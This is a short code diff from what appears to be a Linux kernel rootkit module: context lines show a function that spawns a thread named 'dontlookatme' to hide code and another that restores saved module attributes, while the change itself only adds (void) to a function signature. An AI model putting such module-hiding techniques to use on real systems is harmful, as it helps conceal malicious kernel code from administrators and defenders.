@@ -44,7 +44,7 @@ void hide_code(void){
   kthread_run(hiding_thread, NULL, "dontlookatme");
 }
 
-void make_module_removable(){
+void make_module_removable(void){
 	THIS_MODULE->mkobj.kobj = tmp_kobj;
   THIS_MODULE->sect_attrs = tmp_sect;
   THIS_MODULE->notes_attrs = tmp_notes;
